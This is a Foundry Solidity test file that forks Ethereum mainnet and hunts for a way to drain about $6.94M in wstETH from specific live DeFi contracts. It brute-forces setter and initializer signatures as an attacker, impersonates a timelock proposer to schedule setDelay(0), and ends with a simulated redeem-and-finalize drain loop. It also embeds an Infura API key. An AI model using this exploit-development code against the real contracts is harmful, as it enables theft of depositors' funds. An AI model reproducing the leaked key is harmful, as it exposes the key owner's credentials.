// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ITimelock {
    function schedule(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt, uint256 delay) external;
    function execute(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt) external;
    function getMinDelay() external view returns (uint256);
    function hasRole(bytes32 role, address account) external view returns (bool);
    function getRoleMember(bytes32 role, uint256 index) external view returns (address);
    function getRoleMemberCount(bytes32 role) external view returns (uint256);
}

/**
 * SLOT 4 WRITE VECTOR
 *
 * CONFIRMED: If delay=0 (slot 4), immediate drain works ($6.94M)
 *
 * Now finding a path to write slot 4 as unprivileged attacker
 *
 * Vectors:
 * 1. Timelock execution of pending setDelay(0)
 * 2. Delegatecall to attacker-controlled code
 * 3. Storage collision
 * 4. Proxy upgrade
 * 5. Initialize/reinitialize bug
 */
contract Slot4WriteVector is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TimelockProposalExecution() public {
        console.log("=== TIMELOCK PROPOSAL EXECUTION ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        // Check roles
        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
        bytes32 EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");

        uint256 proposerCount = timelock.getRoleMemberCount(PROPOSER_ROLE);
        uint256 executorCount = timelock.getRoleMemberCount(EXECUTOR_ROLE);

        console.log("Proposer count:", proposerCount);
        console.log("Executor count:", executorCount);

        // List proposers
        console.log("\nProposers:");
        for (uint i = 0; i < proposerCount && i < 5; i++) {
            address member = timelock.getRoleMember(PROPOSER_ROLE, i);
            console.log("  ", i, ":", member);
        }

        // List executors
        console.log("\nExecutors:");
        for (uint i = 0; i < executorCount && i < 5; i++) {
            address member = timelock.getRoleMember(EXECUTOR_ROLE, i);
            console.log("  ", i, ":", member);
        }

        // Check if address(0) has executor role (open execution)
        bool openExecutor = timelock.hasRole(EXECUTOR_ROLE, address(0));
        console.log("\nOpen executor (anyone can execute):", openExecutor);

        // Check min delay
        uint256 minDelay = timelock.getMinDelay();
        console.log("Min delay:", minDelay / 3600, "hours");
    }

    function test_ImpersonateProposer() public {
        console.log("=== IMPERSONATE PROPOSER ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
        uint256 proposerCount = timelock.getRoleMemberCount(PROPOSER_ROLE);

        if (proposerCount == 0) {
            console.log("No proposers found");
            return;
        }

        address proposer = timelock.getRoleMember(PROPOSER_ROLE, 0);
        console.log("Impersonating proposer:", proposer);

        // Schedule setDelay(0)
        bytes memory data = abi.encodeWithSignature("setDelay(uint256)", 0);

        vm.startPrank(proposer);

        console.log("Scheduling setDelay(0)...");
        try timelock.schedule(R0, 0, data, bytes32(0), bytes32(uint256(1)), 0) {
            console.log("Schedule succeeded!");
        } catch Error(string memory reason) {
            console.log("Schedule failed:", reason);
        } catch {
            console.log("Schedule failed (low-level)");
        }

        vm.stopPrank();
    }

    function test_ExecutePendingProposal() public {
        console.log("=== EXECUTE PENDING PROPOSAL ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        bytes32 EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");

        // Check if anyone can execute
        bool openExecutor = timelock.hasRole(EXECUTOR_ROLE, address(0));
        console.log("Open executor:", openExecutor);

        // Try to execute as attacker
        bytes memory data = abi.encodeWithSignature("setDelay(uint256)", 0);

        vm.startPrank(attacker);

        console.log("Trying to execute setDelay(0) as attacker...");
        try timelock.execute(R0, 0, data, bytes32(0), bytes32(0)) {
            console.log("Execute succeeded!");

            // Check if delay changed
            bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
            uint256 newDelay = (uint256(slot4) >> 96) & type(uint32).max;
            console.log("New delay:", newDelay);
        } catch {
            console.log("Execute failed");
        }

        vm.stopPrank();
    }

    function test_R0FunctionScanner() public {
        console.log("=== R0 FUNCTION SCANNER ===\n");

        // Scan R0 for any function that modifies slot 4

        // First check known functions
        console.log("Testing view functions:");
        (bool s1, bytes memory d1) = R0.staticcall(abi.encodeWithSignature("delay()"));
        if (s1 && d1.length >= 32) {
            console.log("delay():", abi.decode(d1, (uint256)) / 86400, "days");
        }

        (bool s2, bytes memory d2) = R0.staticcall(abi.encodeWithSignature("owner()"));
        if (s2 && d2.length >= 32) {
            console.log("owner():", abi.decode(d2, (address)));
        }

        // Try ALL possible setter functions
        console.log("\nTrying setter functions as attacker:");
        vm.startPrank(attacker);

        string[30] memory funcs = [
            "setDelay(uint256)",
            "setRedemptionDelay(uint256)",
            "updateDelay(uint256)",
            "setCooldown(uint256)",
            "setMinDelay(uint256)",
            "setMaxDelay(uint256)",
            "changeDelay(uint256)",
            "modifyDelay(uint256)",
            "adjustDelay(uint256)",
            "configure(uint256)",
            "setConfig(uint256)",
            "setParams(uint256)",
            "initialize(uint256)",
            "reinitialize(uint256)",
            "setup(uint256)",
            "init(uint256)",
            "setParameter(bytes32,uint256)",
            "updateParameter(bytes32,uint256)",
            "setSlot(uint256,uint256)",
            "storeValue(uint256,uint256)",
            "write(uint256,uint256)",
            "set(bytes32,bytes32)",
            "adminSetDelay(uint256)",
            "ownerSetDelay(uint256)",
            "timelockSetDelay(uint256)",
            "emergencySetDelay(uint256)",
            "forceSetDelay(uint256)",
            "setRedemption(uint256)",
            "configureRedemption(uint256)",
            "setDelayPeriod(uint256)"
        ];

        bytes32 slot4Before = vm.load(R0, bytes32(uint256(4)));

        for (uint i = 0; i < funcs.length; i++) {
            (bool success,) = R0.call(abi.encodeWithSignature(funcs[i], 0));
            if (success) {
                bytes32 slot4After = vm.load(R0, bytes32(uint256(4)));
                if (slot4After != slot4Before) {
                    console.log("*** SLOT 4 CHANGED BY:", funcs[i], "***");
                    slot4Before = slot4After;
                }
            }
        }

        vm.stopPrank();
    }

    function test_RCDelegatecallExploitableTarget() public {
        console.log("=== RC DELEGATECALL EXPLOITABLE TARGET ===\n");

        // RC has 4 delegatecalls
        // If any of them delegatecalls to a user-controllable address...

        // RC reads addresses from storage during delegatecall (R0's storage)
        // Check R0's storage for addresses

        console.log("R0 storage addresses:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(R0, bytes32(i));
            address addr = address(uint160(uint256(slot)));
            if (addr != address(0) && addr.code.length > 0) {
                console.log("Slot %d: %s (code: %d)", i, addr, addr.code.length);
            } else if (uint256(slot) != 0) {
                console.log("Slot %d: %s", i);
                console.logBytes32(slot);
            }
        }

        // The key insight: if R0's storage contains an address that RC delegatecalls to,
        // and if we can change that address to point to our contract...

        // Check if any slot can be written by attacker
        console.log("\nLooking for writable slots...");

        // Slot 5 is the mapping base - can we manipulate it?
        // Slots after 5 are user data...
    }

    function test_StorageOverlapAttack() public {
        console.log("=== STORAGE OVERLAP ATTACK ===\n");

        // If a user's redemption data overlaps with slot 4...
        // We'd need: keccak256(keccak256(attacker, 5)) + N = 4

        // This is computationally infeasible but let's verify

        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        console.log("Attacker's array base slot:");
        console.logBytes32(arrayBaseSlot);
        console.log("Target slot 4:");
        console.logBytes32(bytes32(uint256(4)));

        // How many redemptions needed to reach slot 4?
        // arrayBaseSlot + N = 4
        // N = 4 - arrayBaseSlot (mod 2^256)

        uint256 needed = (4 + type(uint256).max - uint256(arrayBaseSlot) + 1);
        console.log("Redemptions needed for collision:", needed);
        console.log("This is infeasible");
    }

    function test_FindInitializeBug() public {
        console.log("=== FIND INITIALIZE BUG ===\n");

        // Check if R0 can be re-initialized

        // Check initialized slot
        // OpenZeppelin's Initializable uses slot keccak256("oz.initializable") or similar

        bytes32 initSlot = keccak256(abi.encode("eip1967.proxy.beacon"));
        bytes32 initValue = vm.load(R0, initSlot);
        console.log("Possible init slot:");
        console.logBytes32(initValue);

        // Try various initialize signatures
        vm.startPrank(attacker);

        string[10] memory inits = [
            "initialize()",
            "initialize(address)",
            "initialize(address,address)",
            "initialize(address,address,address)",
            "initialize(address,address,address,uint256)",
            "reinitialize(uint8)",
            "init()",
            "setup()",
            "_init()",
            "__init()"
        ];

        bytes32 slot4Before = vm.load(R0, bytes32(uint256(4)));

        for (uint i = 0; i < inits.length; i++) {
            (bool success,) = R0.call(abi.encodeWithSignature(inits[i]));
            if (success) {
                console.log("Initialize succeeded:", inits[i]);

                bytes32 slot4After = vm.load(R0, bytes32(uint256(4)));
                if (slot4After != slot4Before) {
                    console.log("*** SLOT 4 CHANGED! ***");
                }
            }
        }

        vm.stopPrank();
    }

    function test_VaultOwnerChain() public {
        console.log("=== VAULT OWNER CHAIN ===\n");

        // VAULT is owned by some contract
        // If we can get control of the vault, we can drain directly

        (bool s1, bytes memory d1) = VAULT.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            address vaultOwner = abi.decode(d1, (address));
            console.log("VAULT owner:", vaultOwner);

            // Check if owner is a Gnosis Safe
            bytes32 slot0 = vm.load(vaultOwner, bytes32(uint256(0)));
            console.log("Owner slot 0:");
            console.logBytes32(slot0);

            // Gnosis Safe has singleton at slot 0
            address singleton = address(uint160(uint256(slot0)));
            if (singleton.code.length > 0) {
                console.log("Singleton has code:", singleton.code.length);
            }
        }

        // Check VAULT's allowed callers
        console.log("\nVAULT storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }
    }

    function test_DirectDrainWithStorageHack() public {
        console.log("=== DIRECT DRAIN WITH STORAGE HACK ===\n");

        // This simulates the full exploit if we could write slot 4

        // Step 1: Set delay to 0
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 raw = uint256(slot4);
        uint256 mask = ~(uint256(type(uint32).max) << 96);
        uint256 zeroDelay = raw & mask;
        vm.store(R0, bytes32(uint256(4)), bytes32(zeroDelay));

        // Verify delay is 0
        bytes32 newSlot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 newDelay = (uint256(newSlot4) >> 96) & type(uint32).max;
        console.log("Delay set to:", newDelay, "seconds");

        // Step 2: Drain vault
        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault balance:", vaultBalance / 1e18, "wstETH");

        deal(TASSET, attacker, vaultBalance * 2);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 totalDrained = 0;
        uint256 redeemCount = 0;

        while (IERC20(wstETH).balanceOf(VAULT) > 0 && redeemCount < 5) {
            uint256 vaultCurrent = IERC20(wstETH).balanceOf(VAULT);
            uint256 toRedeem = vaultCurrent < type(uint96).max ? vaultCurrent : type(uint96).max;

            // Redeem
            R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(toRedeem)));

            // Immediate finalize
            uint256 before = IERC20(wstETH).balanceOf(attacker);
            R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", redeemCount));
            uint256 received = IERC20(wstETH).balanceOf(attacker) - before;

            totalDrained += received;
            redeemCount++;

            console.log("Redemption %d: received %d wstETH", redeemCount, received / 1e18);
        }

        vm.stopPrank();

        console.log("\n=== RESULTS ===");
        console.log("Total drained:", totalDrained / 1e18, "wstETH");
        console.log("Vault remaining:", IERC20(wstETH).balanceOf(VAULT) / 1e18, "wstETH");
        console.log("At $2300/wstETH:", totalDrained * 2300 / 1e18, "USD");
    }
}
